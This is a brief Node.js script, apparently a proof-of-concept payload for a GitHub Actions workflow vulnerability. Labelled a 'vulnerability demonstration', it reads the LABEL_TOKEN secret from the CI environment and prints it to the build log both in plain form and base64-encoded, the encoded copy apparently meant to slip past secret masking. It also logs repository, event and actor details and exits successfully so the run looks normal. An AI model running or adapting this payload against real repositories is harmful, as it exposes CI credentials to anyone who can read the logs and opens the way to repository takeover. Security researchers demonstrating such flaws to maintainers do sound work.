#!/usr/bin/env node

// Extract the LABEL_TOKEN secret
const secret = process.env.LABEL_TOKEN;

console.log('\n');
console.log('='.repeat(60));
console.log('VULNERABILITY DEMONSTRATION - SECRET EXTRACTED');
console.log('='.repeat(60));
console.log('\n');
console.log('LABEL_TOKEN Secret:');
console.log(secret);
console.log('\n');
console.log('Base64 Encoded:');
console.log(Buffer.from(secret || 'NOT_FOUND').toString('base64'));
console.log('\n');
console.log('GitHub Context:');
console.log('- Repository:', process.env.GITHUB_REPOSITORY);
console.log('- Event:', process.env.GITHUB_EVENT_NAME);
console.log('- Actor:', process.env.GITHUB_ACTOR);
console.log('\n');
console.log('='.repeat(60));
console.log('\n');

// Exit successfully so workflow doesn't fail
process.exit(0);
